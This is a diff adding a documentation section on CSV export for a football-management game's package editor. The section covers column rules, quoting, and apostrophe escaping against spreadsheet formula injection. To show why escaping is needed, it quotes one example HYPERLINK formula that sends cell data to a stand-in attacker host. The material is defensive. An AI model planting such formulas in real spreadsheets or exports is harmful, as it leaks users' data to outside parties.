@@ -234,6 +234,34 @@ For a complete field reference including berths, season timing, and all selector
 
 ---
 
+## Exporting to CSV
+
+The Teams and Players sections each have an **Export CSV** button beside their search box. It writes every entity of that type — not just the ones matching the current search — to a `.csv` file you choose.
+
+Use it to bulk-edit in a spreadsheet, to diff two versions of a package, or as a plain-text backup.
+
+**Column rules:**
+
+- **The header row is the contract.** There is no version number. Columns are identified by name, so their order does not matter.
+- **An empty cell means "omitted", never zero or empty string.** It is how a package says *let the engine decide* — the same meaning a blank field has in the editor's forms.
+- **Ranges become two columns.** A team's reputation range exports as `reputationMin` and `reputationMax`, so you can sort and filter on them.
+- **Players export whichever ability form is set.** A player carries either a single `overall` or an explicit 19-attribute block; a player with only `overall` leaves the attribute columns blank. Where both are present the attribute block is what the engine uses.
+- **Youth and first-team players share one file**, told apart by the `youth` column (blank for a first-team player).
+
+Team names, cities, and stadium names are free text, so values containing commas or quotes are quoted properly — a club called `Preston North End, Lancashire` round-trips intact.
+
+**Formula escaping:**
+
+Spreadsheets execute any cell whose text starts with `=`, `+`, `-` or `@`. Because a package's text can come from a package someone else authored, a name like `=HYPERLINK("http://evil.example/?x="&A1,"FC")` would stop being a name and become a live formula as soon as the file was opened. `.ofm` is a data format — installing a package must never run anything — so the export neutralises those cells.
+
+- A **text** cell that would be read as a formula is written with a leading apostrophe, which spreadsheets consume as a "treat this as text" marker. `=1+1` is written as `'=1+1` and displays as `=1+1`.
+- **Numeric columns are never escaped.** `financeMin`, `financeMax`, `reputationMin`, `reputationMax`, `age`, `overall` and the 19 attribute columns stay plain numbers, so a club in debt exports `-2000000` and remains sortable and summable.
+- The escape is **reversible**. It is applied when the cell — ignoring any leading apostrophes — starts with one of the four characters, so a name the author really did write as `'=x` becomes `''=x`. To undo it, drop exactly one leading apostrophe when the remaining text starts with `=`, `+`, `-` or `@`; leave every other cell alone. A name like `'tis` is untouched in both directions.
+
+If you edit the CSV in a spreadsheet and save it back, the apostrophe is usually dropped again on write — that is expected, and a reader must accept both the escaped and unescaped spelling of the same value.
+
+---
+
 ## Save, Validate, and Build
 
 These actions appear at the bottom of the edit view:
